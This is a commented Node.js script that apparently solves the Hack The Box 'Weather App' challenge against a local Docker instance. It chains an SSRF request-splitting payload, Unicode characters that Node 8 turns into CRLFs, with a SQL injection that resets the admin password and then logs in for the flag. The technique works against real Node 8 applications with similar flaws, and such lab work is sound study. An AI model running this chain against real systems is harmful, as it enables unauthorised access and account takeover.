var request = require("request");

/**
 * The target instance of the challenge. To run one locally just run the
 * following commands in the root directory of the challenge files available
 * at https://app.hackthebox.com/challenges/weather-app.
 *
 * docker build -t temp .
 * docker run --rm -it -p 8080:80 temp
 */
var target = "127.0.0.1:8080";

/**
 * The big picture thing we want to do is an SSRF Request Split attack; get a
 * GET request on the server to do a POST request for us on the side. To do
 * that we exploit the way http.get parses HTTP protocol strings and a quirk
 * of how urls can be encoded. For more information check out Ryan F. Kelly's
 * article where I got most of the knowledge I needed to apply this form of
 * attack on this challenge:
 * 
 * Security Bugs in Practice: SSRF via Request Splitting
 * - Ryn F Kelly (https://www.rfk.id.au/ - https://github.com/rfk)
 * https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/
 */


/**
 * The first thing we'll craft is the header of the request.
 * Note that content-length is calculated and appended later:
 *
 * 127.0.0.1/ HTTP/1.1
 *
 * POST http://127.0.0.1/register HTTP/1.1
 * Host: 127.0.0.1
 * Content-Type: application/json
 * Content-Length:
 */
var header = `127.0.0.1/\u{0120}HTTP/1.1\
\u{010D}\u{010A}\u{010D}\u{010A}\
POST\u{0120}http://127.0.0.1/register\u{0120}HTTP/1.1\
\u{010D}\u{010A}\
Host:\u{0120}127.0.0.1\
\u{010D}\u{010A}\
Content-Type:\u{0120}application/json\
\u{010D}\u{010A}\
Content-Length:\u{0120}`;

/**
 * This is the part of the payload that holds the json. I crafted it in
 * payload.json, copied it to an string->escaped unicode converter here:
 *
 * https://dencode.com/en/string/unicode-escape
 *
 * Then converted the \u00XX escaped unicode to escaped latin1 with the
 * following regex-replace in vscode:
 *
 * (\\u)[0-f]{2}([0-f]{2}) -> $1{01$2}
 *
 * The payload itself turns the following query made in database.js on line 32:
 *
 * INSERT INTO users (username, password) VALUES ('${user}', '${pass}')
 *
 * into this query:
 *
 * INSERT INTO users (username, password) VALUES ('admin', 'admin') \
 *            ON CONFLICT(username) DO UPDATE SET password='admin'; --')
 *
 * This effectively changes the random password generated on startup on line 24
 * of database.js to just 'admin'
 */
var body = `\u{017b}\u{0122}\u{0175}\u{0173}\u{0165}\u{0172}\u{016e}\u{0161}\
\u{016d}\u{0165}\u{0122}\u{013a}\u{0122}\u{0161}\u{0164}\u{016d}\u{0169}\
\u{016e}\u{0122}\u{012c}\u{0122}\u{0170}\u{0161}\u{0173}\u{0173}\u{0177}\
\u{016f}\u{0172}\u{0164}\u{0122}\u{013a}\u{0122}\u{0161}\u{0164}\u{016d}\
\u{0169}\u{016e}\u{0127}\u{0129}\u{0120}\u{014f}\u{014e}\u{0120}\u{0143}\
\u{014f}\u{014e}\u{0146}\u{014c}\u{0149}\u{0143}\u{0154}\u{0128}\u{0175}\
\u{0173}\u{0165}\u{0172}\u{016e}\u{0161}\u{016d}\u{0165}\u{0129}\u{0120}\
\u{0144}\u{014f}\u{0120}\u{0155}\u{0150}\u{0144}\u{0141}\u{0154}\u{0145}\
\u{0120}\u{0153}\u{0145}\u{0154}\u{0120}\u{0170}\u{0161}\u{0173}\u{0173}\
\u{0177}\u{016f}\u{0172}\u{0164}\u{013d}\u{0127}\u{0161}\u{0164}\u{016d}\
\u{0169}\u{016e}\u{0127}\u{013b}\u{0120}\u{012d}\u{012d}\u{0122}\u{017d}`;

/**
 * 3xCRLF and a GET to make the
 * /data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey} left on
 * the right side of the url path generated on line 8 of WeatherHelper.js. this
 * will 404 out but it's simply to make a clean exit from the HTTP request
 * parsing done by http.get in HttpHelper.GetHttp.
 *
 * Ultimately we only care that the POST executes since that has the
 * sqlinjection payload.
 */
var suffix = `\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\
GET\u{0120}`;

// Calculated the content length and put the pieces together.
var exploit_str = header + (Buffer.from(body, "latin1").length).toString() +
  "\u{010D}\u{010A}\u{010D}\u{010A}" + body + suffix;

// Debug print it so we can see what we produced
var endpoint_str = Buffer.from(exploit_str, "latin1").toString();
console.log(endpoint_str);

/**
 * There is logic in the POST /register request to only allow 127.0.0.1 to
 * register new users. The only code on the server side that does an HTTP
 * request is line 8 of WeatherHelper.js and it's a GET request. With the
 * above payload on a server running NodeJS 8, we can exploit the http.get's
 * SSRF vulnerability and have the http.get execute a post on /register with
 * the malicious sql-injecting payload described above. By executing a SSRF to
 * call /register, the ip will show as 127.0.0.1, bypassing the local-host-only
 * logic.
 */
var options = {
  json: {
    "city": "Columbus",
    "country": "USA",
    "endpoint": exploit_str // Our malicious payload
  },
  method: "POST",
  uri: `http://${target}/api/weather`
};

request(options, function (error, response, body) {
  if (!error && response.statusCode === 200) {
    console.log(body);
  }else{
    console.log(error);
  }
});


/**
 * At this point the SQL injections should have occurred so execute a login
 * request.
 */
options = {
  json: {
    "password": "admin",
    "username": "admin"
  },
  method: "POST",
  uri: `http://${target}/login`
};


/**
 * On your docker isntance you should see the following output:
 *
 * { error: 'Could not find Columbus or USA' }
 * HTB{f4k3_fl4g_f0r_t3st1ng}
 *
 * Order may be flipped due to them executing asyncronously.
 */
request(options, function (error, response, body) {
  if (!error && response.statusCode === 200) {
    console.log(body);
  }else{
    console.log(error);
  }
});
